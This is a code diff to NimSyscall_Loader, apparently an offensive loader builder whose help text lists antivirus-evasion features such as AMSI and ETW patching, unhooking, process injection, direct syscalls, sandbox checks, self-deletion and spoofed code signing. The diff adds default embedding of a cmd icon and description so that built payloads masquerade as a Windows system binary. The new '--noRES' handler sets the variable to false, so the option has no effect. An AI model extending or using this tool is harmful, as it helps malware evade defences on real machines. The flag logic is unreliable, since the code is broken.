@@ -57,7 +57,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.5
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --noRES --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --sleepycrypt]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -70,6 +70,7 @@ Options:
   --file filename  File to encrypt.
   --key key     Key to encrypt with
   --output filename    Filename for encrypted exe/dll
+  --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
   --dll     Generate DLL instead of an exe
   --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
   --noETW    Don't use ETW Patch
@@ -190,6 +191,7 @@ var
     noassembly: bool = false
     sleepycrypt: bool = false
     noDInvoke: bool = false
+    noRES: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.5")
 
@@ -241,6 +243,10 @@ else:
 if args["--output"]:
   let outname = args["--output"]
   outfile = fmt"{outname}"
+
+if args["--noRES"]:
+  noRES = false
+
 
 if args["--remoteprocess"]:
   let remoteprocessesstring = args["--remoteprocess"]
@@ -1193,6 +1199,11 @@ elif system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
+if (not noRES):
+    when system.hostOS == "windows":
+        basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\icores.o ")
+    else:
+        basicCompileFlags.add(fmt"--passL:{packerPath}/resource/icores.o ")
 
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
